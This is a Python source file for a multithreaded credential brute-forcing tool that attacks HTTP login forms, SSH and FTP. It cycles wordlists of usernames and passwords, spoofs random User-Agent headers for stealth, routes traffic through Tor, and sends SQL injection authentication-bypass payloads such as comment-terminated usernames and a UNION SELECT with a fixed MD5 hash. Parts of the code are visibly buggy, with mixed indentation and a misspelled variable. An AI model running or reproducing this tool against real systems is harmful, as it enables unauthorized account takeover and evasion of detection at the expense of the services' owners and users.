import re
import requests
import threading
from threading import Thread
import time
from console import Console
import random
from ftplib import FTP
import json
from message import Message
from form_controls import LoginForm
try:
	import pexpect
except:
	print('Issues importing \'pexpect\'.. Try: pip install pexpect')

# class: Hive
# description: This object's purpose is a basic layout of what is needed to bruteforce logins, acts as a skeleton class to other bruteforcers
class Hive:
	useTor = None
	UPDATE_TIME = 10
	sharedUsernameList = None
	sharedPasswordList = None
	usernameFile = None
	passwordFile = None
	username = None
	isFinished = None
	workerList = None
	passListLength = None
	startTime = None
	total_attempts = None
	lastUpdated = None
	verbose = None
	__onSuccessHandle__ = None
	target = None
	logLock = None
	message = Message()
	totalLogins = None
	
	# function: __init__
	# description: Constructor - *NOTE* Call parent __init__ from any inherited objects from Hive
	def __init__(self):
		self.sharedUsernameList = list()
		self.sharedPasswordList = list()
		self.workerList = list()
		self.isFinished = False	
		self.total_attempts = 0
		self.historyIndex = 0
		self.lastUpdated = time.time()
		self.verbose = False
		self.useTor = False
		self.totalLogins = 0
		self.logLock = threading.Lock()

	# function: start
	# param: workers(int)			- The number of threads to create
	# description: Starts the bruteforcing process
	def start(self, workers=1):
		if not self.startTime:
			self.startTime = time.time()
		if not self.username:
			usernameLists = self.__splitList__(self.sharedUsernameList,workers)
			for usernames in usernameLists:
				thread = Thread(target=self.run, args=(sorted(usernames),))
				self.workerList.append(thread)
		else:
			passwordLists = self.__splitList__(self.sharedPasswordList,workers)
			for passwords in passwordLists:
				thread = Thread(target=self.run, args=(None,sorted(passwords),))
				self.workerList.append(thread)
		for worker in self.workerList:
			worker.start()
		for worker in self.workerList:
			worker.join()


	# function: __populateLists__
	# description: Populates sharedUsernameList, and sharedPasswordList 
	def __populateLists__(self):
		cleanup_regex = re.compile(r'\s')	
		if not self.username:
			for username in open(self.usernameFile, 'r').readlines():
				username = cleanup_regex.subn('',username)[0]
				username = username.split('\n')
				self.sharedUsernameList.append(username)
		
		for password in open(self.passwordFile, 'r').readlines():
			password = cleanup_regex.subn('', password)[0]
			password = password.split('\n')
			self.sharedPasswordList.append(password)	
		self.sharedUsernameList = sorted(self.sharedUsernameList,reverse=True)
		self.sharedPasswordList = sorted(self.sharedPasswordList,reverse=True)


	# function: setup - Override
	# description: Each object that inherits from Hive should have their own version of this.. Call super objects setup from within
	#	custom Hive object's setup()
	def setup(self):
		self.__populateLists__()

	# function: attemptLogin - Override 	
	# param: Credential	- The credentials to attempt a login with
	# return: Boolean	- Any object that overrides this should return True | False
	# description: Any object that inherits from Hive, should have their own version of this function
	def attemptLogin(self,credential):
		self.total_attempts += 1
		return False

	# function: __displayMessage__
	# param: credential
	# param: success
	# description: Responsible for displaying Login Success/Failure messages, and calls __onSuccessHandle__ for special post exploits if any
	def __displayMessage__(self, credential, success):
		# Display Login on Success message
		if success:
			self.isFinished = True
			with self.logLock:
				credential.wasSuccess = True
				# Call specialized post exploit function if any
				if self.__onSuccessHandle__:
					self.__onSuccessHandle__(credential)
				# Else just display login success message and exit
				# Ensuring login was a success
				elif self.attemptLogin(credential):
					self.totalLogins += 1
					message = self.message.successMessage("Authentication Success ")
					message += "username: %s "%self.message.format(credential.username,['green','bold'])
					message += "password: %s "%self.message.format(credential.password,['green','bold'])
					print(message)
					exit()
		# Display Authentication Failure message
		else:
			with self.logLock:
				credential.wasSuccess = False
				message = self.message.failedMessage("Authentication Failure ")
				message += "username: %s "%self.message.format(credential.username,['red','bold'])
				message += "password: %s "%self.message.format(credential.password,['red','bold'])
				if self.verbose:
					print(message)	
		# if elapsed time is since last 'show statistics' is longer then self.UPDATE_TIME
		# then display statistics
		if (time.time() - self.lastUpdated) > self.UPDATE_TIME:
				statistics = self.getStatistics()
				message = self.message.infoMessage("Attack Statistics ")
				for key in statistics.keys():
					message += self.message.format(key,['dim']) + self.message.format(': '+statistics[key],['bold']) + ' '
				print(message)

	# function: run
	# description: This function should never be overriden. This is responsible for synchronization between workers.
	# 	This function also displays to the screen the results. Called from self.start() 
	def run(self,usernames,passwords=None):
		if not self.username:
			for username in usernames:
				username = username[0] 
				for password in self.sharedPasswordList:
					password = password[0]
					if not self.isFinished:
						credential = Credential(username,password,self.target)
						success = self.attemptLogin(credential)
						self.__displayMessage__(credential, success)
					else:
						exit()	
		# A specific username was specified, using this username instead of usernames from usernameFile
		else:
			try:
				for password in passwords:
					password = password[0]
					if not self.isFinished:
						credential = Credential(self.username,password,self.target)
						success = self.attemptLogin(credential)
						self.__displayMessage__(credential, success)
					# Finished, there was a successful login
					else:
						exit()
			except TypeError as e:
				pass

	
	# function: getStatistics
	# return: dict
	# description: returns a dictionary of statistics on this attack
	def getStatistics(self):
		elapsed = time.time() - self.startTime
		self.lastUpdated = time.time()
		aps = float(self.total_attempts/elapsed)
		return {'target':self.target,'total-attempts':str(self.total_attempts),'attempts-per-second':'%.2f'%aps,'total-time (seconds)':'%.2f'%elapsed}
	
	# function: setOnSuccessHandle
	# param: handle		- Custom handle to deal with successful logins
	# description: Sets function to call on successful login, for post exploit, or whatever.
	# *NOTE* its important to note that the handle must accept, a Credential object, nothing more nothing less
	def setOnSuccessHandle(self,handle):
		self.__onSuccessHandle__ = handle
	
	# function: setupTOR - Override me
	# description: Each object that inherits from Hive that wishes to use TOR, must explicity set 
	#	it up within their own version of this function. *NOTE* Also keep in mind inside attemptLogin you should do 
	#	the magic of actually using TOR.
	def setupTOR(self):
		pass

	# function: __splitList__
	# param: []		- array to split
	# param: int		- how many arrays to create from the orginal
	# return: [[]]		- 2 dimensional array
	# description: Evenly disperses all the items of listToSplit, into specified number of arrays
	def __splitList__(self,listToSplit,splitNum):
		lists = list()
		if len(listToSplit) > 1:
			# Ensuring that the split happens regardless of size
			while splitNum > len(listToSplit):
				splitNum /= 2
			size = len(listToSplit)/splitNum
			endIndex = 0
			for index in range(splitNum):
				startIndex = index*size
				endIndex = startIndex+size	
				lists.append(listToSplit[startIndex:endIndex])
			# Splitting the remaining items amoung the other arrays
			if endIndex%len(listToSplit) != 0:
				index = 0
				for item in listToSplit[endIndex:]:
					if index <= len(lists):
						lists[index].append(item)
						index += 1
					else:						
						lists[index].append(item)
						index = 0
		else:
			lists.append(listToSplit)
		return lists
	
	# function: showPostStatisticsMessage
	# description: Displays the post statistics of this attack, to the screen 
	def showPostStatisticsMessage(self):
		elapsed = time.time() - self.startTime
		print(self.message.infoMessage("Finished in %d second(s), with %d attempt(s), and %d successful login(s)"%(elapsed, self.total_attempts, self.totalLogins)))
	


# class: Credential
# description: A credential used to attempt a login
class Credential:
	host = None
	port = None
	username = None
	password = None
	wasSuccess = None
	
	def __init__(self,username, password, host, port=None):
		self.username = username
		self.password = password
		self.host = host
		self.port = port
		self.wasSuccess = False
	
	def __str__(self):
		return "%s:%s %s %s %s"%(self.host,self.port,self.username,self.password,str(self.wasSuccess))

# class: HttpHive
# description: HTTP Bruteforce object, capable of bruteforcing html login forms
class HttpHive(Hive):
	# To spoof the user-agent every request
	userAgents = ['Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
		      'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
		      'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.1.1; SHIELD Tablet Build/LMY48C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36',
		      'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
		      'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36',
		      'Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
		      'Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22',
		      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
		      'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36',
		      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
		      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
		      'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
		      'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)',
		      'AppleTV5,3/9.1.1']

	usernameField = None
	passwordField = None
	url = None
	password_field_name = None
	username_field_name = None
	failedbaseline = None
	# Various Regular-expressions 
	FORM_REGEX = re.compile(r'<form(.*?)<\/form>')
        CLEANUP_REGEX = re.compile(r'\n')
	CLEANUP2_REGEX = re.compile(r'[(\s\s)|\t|\n]+') 
        NAME_REGEX = re.compile(r'name\=\"(.*?)\"|name\=\'(.*?)\'') 
        VALUE_REGEX = re.compile(r'value\=\"(.*?)\"|value\=\'(.*?)\'')
	LOGIN_REGEX = re.compile(r'type\=[\"\']password[\"\']')
        FIELD_REGEX = re.compile(r'(<input\stype\=.*?>)|(<input\sname\=.*?>)')
	CHECK_TOR_REGEX = re.compile(r'Congratulations\.\sThis\sbrowser\sis\sconfigured\sto\suse\sTor\.')
	AUTHENTICATION_TYPE = re.compile(r'method\=\'(post)\'|method\=\"(post)\"|method\=\'(get)\'|method\=\"(get)\"')
	CAPTCHA_REGEX = re.compile(r'captcha?',re.I)
	# Base payload for our login attempts
	basePayload = None
	proxies = None
	form_method = None
	examplePayload = None 
	SQLInjectionFile = None
	SQLInjectionCredentialList = None
	testSQLInjections = None
	loginForm = None
	baselineDict = None
	captchaFlag = None
	responseTime = None

	def __init__(self):
		Hive.__init__(self)
		self.form_method = 0
		self.examplePayload = ''
		self.testSQLInjections = False
		self.SQLInjectionCredentialList = list()
		self.baselineDict = dict()
		self.captchaFlag = False
		self.responseTime = 0
	
	# function: start
	# param: workers(int)			- The number of threads to create
	# description: Overriden in order to test for SQL injections, if specified.
	def start(self,workers=1):
		self.startTime = time.time()
		if self.testSQLInjections == True:
			threads = list()
			self.SQLInjectionFile = './data/sql-inject.json'
			self.__loadLoginSQLInjection__()
			credlists = list()
			if len(self.SQLInjectionCredentialList) > workers:
				credlists = self.__splitList__(self.SQLInjectionCredentialList,workers)
				for credList in credlists:
					thread = Thread(target=self.__attemptSQLInjection__,args=(credList,))
					threads.append(thread)
				for worker in threads:
					worker.start()
				for worker in threads:
					worker.join()	
			else:
				self.__attemptSQLInjection__(self.SQLInjectionCredentialList)
		Hive.start(self,workers)
	
	# function: setupLoginForm
	# param: html(str)		- The html of the url to the login form
	# description: Sets up the necessary parameters to interact with the web-form
	def setupLoginForm(self,html):
		html = self.CLEANUP2_REGEX.subn(' ',html)[0]
		form_html = LoginForm.FORM_REGEX.findall(html)[0]
		self.loginForm = LoginForm(form_html,self.target)				
		self.baselineDict = self.buildBaselineDict()
		username = "username-here"
		password = "password-here"
		self.examplePayload = self.loginForm.getPayload(username,password)['payload']

	# function: attemptLogin
	# param: credential(Credential)		- The credential to attempt a login with
	# return: Boolean			- True if successful
	# description: Attempts a login with the specified login
	def attemptLogin(self, credential):
		wasSuccess = False
		Hive.attemptLogin(self, credential)
		payloadDict = self.loginForm.getPayload(credential.username,credential.password)
		payload = None
		url = payloadDict['url']
		if payloadDict['method'] == 'POST':
			payload = payloadDict['payload']
		else:
			url = payloadDict['payload']
		response = self.makeRequest(url,payload,payloadDict['method'])
		wasSuccess = self.checkSuccess(response)
		return wasSuccess
	
	# function: buildBaselineDict
	# return: dict		- The baseline dict for a failed login attempt
	# description: Returns a dictionary containing what was determined as baseline values for a failed login attempt.
	# If while comparing these values to new values, to check if a login was successful, the baseline should deviate greatly from the response being checked
	def buildBaselineDict(self):
		baseline = dict()
		payloadDict = self.loginForm.getPayload('admin','passw')
		payload = None
		url = payloadDict['url']
		if payloadDict['method'] == 'POST':
			payload = payloadDict['payload']
		else:
			url = payloadDict['payload']
		response = self.makeRequest(url,payload,payloadDict['method'])
		cleaned_html = self.CLEANUP2_REGEX.subn(' ',response.text)[0]
		try:
			baseline['response-length'] = int(response.headers['content-length'])
		except KeyError as e:
			baseline['response-length'] = len(response.text)
		baseline['url'] = response.url
		baseline['status-code'] = response.status_code
		baseline['total-forms'] = len(LoginForm.FORM_REGEX.findall(cleaned_html))
		baseline['response-time'] = response.elapsed.total_seconds()
		if self.CAPTCHA_REGEX.search(cleaned_html):
			baseline['captcha'] = True
			self.captchaFlag = True
		else:
			baseline['captcha'] = False
		return baseline

	# function: checkSuccess
	# param: response(response)	- The response to check for successful login
	# description: Checks if this response object was a successful login
	def checkSuccess(self,response):
		wasSuccess = self.compareResponseToBaseline(response)	
		return wasSuccess

	# function: compareResponseToBaseline
	# param: response(response)	- The response object to compare to baseline with
	# return: Boolean		- True | False if not comparable differences
	# description: Determines if this response was successful authentication or not 
	def compareResponseToBaseline(self,response):
		totalForms = 0
		length = 0
		responseTime = response.elapsed.total_seconds()
		self.responseTime += responseTime
		wasSuccess = False
		cleanedHtml = self.CLEANUP2_REGEX.subn(' ',response.text)[0]
		# Flags for changes found from baseline, not all are currently being used
		responseLengthFlag = False
		responseUrlFlag = False
		statusCodeFlag = False
		totalFormFlag = False
		captchaFlag = False
		timeFlag = False
		# ----------------- End Flags -------------------------------------------
		try:	
			lenth = int(response.headers['content-length'])
		except KeyError as e:
			length = len(response.text)
		totalForms = len(LoginForm.FORM_REGEX.findall(cleanedHtml))
		if self.CAPTCHA_REGEX.search(cleanedHtml):
			captchaFlag = True
		if response.status_code is not self.baselineDict['status-code']:
			statusCodeFlag = True	
		# Not relieable, maybe add a check sum for multiple parts of the page, 
		# and return a % based result on how many checksums have changed?
		# However this could be a slow down/bottle neck 
		if abs(length-self.baselineDict['response-length']) > 100:
			responseLengthFlag = True
		if totalForms != self.baselineDict['total-forms']:
			totalFormFlag = True
		if response.url != self.baselineDict['url']:
			responseUrlFlag = True
		# -------------- NOW CHECKING FLAGS AND DETERMINING IF SUCCESS ----------
		if responseUrlFlag:
			# So far the only signifcant change I've found after a login, is the total form count on the URL
			# Until I find more consistent changes, this will be the main deciding factor
			if totalFormFlag:
				wasSuccess = True
		else:
			if not captchaFlag:
				if totalFormFlag:
					wasSuccess = True
		# Should notify user at this point a captcha was detected
		if captchaFlag:
			wasSuccess = False 
			self.captchaFlag = True
		return wasSuccess

	# function: makeRequest
	# param: url(str)		- The url to make a request to
	# param: payload(dict|None)	- The payload to use
	# param: method(str='POST')	- The method to use with this request, POST or GET
	# description: Used when making request, called from here rather then arbitary places. Easier to keep track of and ensures consistents between requests
	def makeRequest(self, url, payload, method='POST'):
		headers = self.getSpoofedHeaders()
		if method == 'POST':
			response = requests.post(url, data=payload, headers=headers, proxies=self.proxies)
			return response
		# Must be a GET request
		else:
			response = requests.get(url, headers=headers, proxies=self.proxies)
			return response

	# function: getStatistics
	# return: dict
	# description: returns a dictionary of statistics on this attack
	def getStatistics(self):
		elapsed = time.time() - self.startTime
		self.lastUpdated = time.time()
		aps = float(self.total_attempts/elapsed)
		averageResponseTime = float(self.responseTime/self.total_attempts)
		return {'target':self.target,'total-attempts':str(self.total_attempts),'attempts-per-second':'%.2f'%aps,'total-time':'%.2f (seconds)'%elapsed,
			'average-response-time':'%.3f (seconds)'%averageResponseTime}

	# function: setup - Overriden
	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
	def setup(self):
		Hive.setup(self)
		if self.useTor:
			self.setupTOR()
		html = self.makeRequest(self.target, None, "GET").text
		self.setupLoginForm(html)
		self.setOnSuccessHandle(self.postExploit)
	
	# function: getSpoofedHeaders
	# return: dict		- A dict that represents a user-agent inside the HTTP header
	# description: Returns a spoofed headers, to use with the login. Increases stealth
	def getSpoofedHeaders(self):
		headers = {'Connection':'close','User-Agent':random.choice(self.userAgents)}
		return headers

	# function: postExploit
	# param: credential
	# description: This is an example of a post exploit function, as you can see it requires a credential object
	# In this function you can save the credential to a Database, and continue/quit or whatever
	# You don't need the same signature for every post exploit function, however you do need to use: self.setOnSuccessHandle(somefunction) to set the handle
	def postExploit(self,credential):
		# Ensuring success, *NOTE* currently there is a threading bug that is overwriting parts of memory?
		# This is a, jimmy rigged way of doing, however it will suffice, and doesn't hurt performance, as this will only happen, 1-3 times during a 
		# bruteforce
		if self.attemptLogin(credential):
			self.totalLogins += 1
			message = self.message.successMessage("Authentication Success ")
			message += "username: %s password: %s "%(self.message.format(credential.username,['green','bold']),self.message.format(credential.password,['green','bold']))
			print(message)
		exit()
	
	# function: checkTor
	# return: Boolean
	# description: checks to see if TOR is proprely configured
	def checkTor(self):
		isConfigured = False
		if self.useTor:
			self.setupTOR()
		if self.proxies:
			try:
				response = self.makeRequest('http://check.torproject.org/', None, "GET")
				if self.CHECK_TOR_REGEX.search(response.text):
					isConfigured = True	
			except Exception as e:
				print(e)
		return isConfigured 
	
	# function: setupTOR
	# description: Sets up the proxies to use TOR
	def setupTOR(self):
		self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}
	
	# function: __loadSQLInjectionFields__
	# description: Loads some SQL Injections specific for logins, into self.SQLInjectionCredentialList
	# 	SQLInjectionCredentialList is used within __attemptSQLInjection__
	def __loadLoginSQLInjection__(self):
		cleanup_regex = re.compile(r'\s')
		with open(self.SQLInjectionFile,'r') as sqlfile:
			sqldata = json.load(sqlfile)
		# Some basic None specific username logins
		for groups in sqldata['logins']:
			username = groups['username']
			password = groups['password']
			cred = Credential(username,password,self.target)
			self.SQLInjectionCredentialList.append(cred)
		# building injections based on supplied username
		if self.username:
			self.SQLInjectionCredentialList += self.__buildSQLInjectionCredentials__(self.username)
			self.SQLInjectionCredentialList = sorted(self.SQLInjectionCredentialList,reverse=True)
		# building injections with supplied username-file
		else:
			for username in open(self.usernameFile, 'r').readlines():
				username = cleanup_regex.subn('',username)[0]
				username = username.split('\n')[0]	
				self.SQLInjectionCredentialList += self.__buildSQLInjectionCredentials__(username)
	
	# function: __buildSQLInjectionCredentials__
	# param: str		- username to build injections with
	# return: [Credential]	- array of SQL Injection based Credentials 
	# description: Builds a list of Credential objects that have SQL injections built around the username supplied
	def __buildSQLInjectionCredentials__(self,username):
		injections = ['%s\' --','%s\' #','%s\'/*','%s\'/**/--','%s\'/**/#']
		new_creds = list()
		for inject in injections:
			user = inject%username
			password = ''	
			cred = Credential(user,password,self.target)
			new_creds.append(cred)
		md5BypassPassword0 = '1234 \' AND 1=0 UNION ALL SELECT \'%s\', \'81dc9bdb52d04dc20036dbd8313ed055'%username
		credential0 = Credential(username,md5BypassPassword0,self.target)
		new_creds.append(credential0)
		md5BypassPassword1 = '1234/**/\'/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/\'%s\',/**/\'81dc9bdb52d04dc20036dbd8313ed055'%username	
		credential1 = Credential(username,md5BypassPassword1,self.target)
		new_creds.append(credential1)
		return new_creds
	
	# function: __attemptSQLInjection__
	# description: Threaded SQL injection login attempt
	def __attemptSQLInjection__(self,sqlLoadedCreds):
		for credential in sqlLoadedCreds:
			result = self.attemptLogin(credential)
			self.__displayMessage__(credential,result)
			if self.isFinished == False:
				self.isFinished = result
			else:
				exit()
				break
			if self.isFinished == True:
				exit()
				break

# class: SSHHive
# description: Hive used to brute-force ssh logins
class SSHHive(Hive):
	baseCommand = None
	TIMEOUT = 0.5
	def __init__(self):
		Hive.__init__(self)
		
	# function: attemptLogin	- Overriden
	# param: Credential		- The credential to attempt a login with	
	# return: Boolean		- True if Success | False if Failure
	# description: This function is responsible for attempting a login with the specified credential, calls other helper functions to get the job done
	def attemptLogin(self,credential):
		Hive.attemptLogin(self,credential)
		success = False
		command = self.__BuildSSHCommand__(credential)
		child = pexpect.spawn(command, timeout=self.TIMEOUT)
		result = child.send(credential.password)
		if result == 8:
			success = True		
		return success
	
	# function: __BuildSSHCommand__ 
	# param: Credential 	- Credential to attempt a login with
	# description: This is responsible for creating a valid ssh login command 
	def __BuildSSHCommand__(self,credential):
		port = 22
		if credential.port:
			port = credential.port		
		command = self.baseCommand%(credential.username,credential.host,port)
		return command
	
	# function: setup
	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
	def setup(self):
		Hive.setup(self)
		self.baseCommand = 'ssh %s@%s -P %s'	
		self.verbose = True

	# function: postExploit
	# param: Credential 	- Credential of successful login 
	# description: This is another example of a post exploit function, as you can see it requires a credential object
	def postExploit(self,credential):
		pass
	
# class: FTPHive
# description: Hive used to brute-force FTP Logins
class FTPHive(Hive):
	ftp = None
	def __init__(self):
		Hive.__init__(self)
	
		
	# function: attemptLogin	- Overriden
	# param: credential		- The credential to attempt a login with
	# return: Boolean		- True if Success | False if Failure
	# description: This function is responsible for attempting a login with the specified credential
	def attemptLogin(self, credential):
		success = False
		Hive.attemptLogin(self, credential)
		username = credential.username
		password = credential.password
		host = credential.host
		try:
			self.ftp = FTP(host)
			result = self.ftp.login(username,password)
			# If result then this was a successful login
			if result:
				success = True
			self.ftp.close()
		except:
			pass
		return success 
				
	
	# function: setup
	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
	def setup(self):
		Hive.setup(self)	
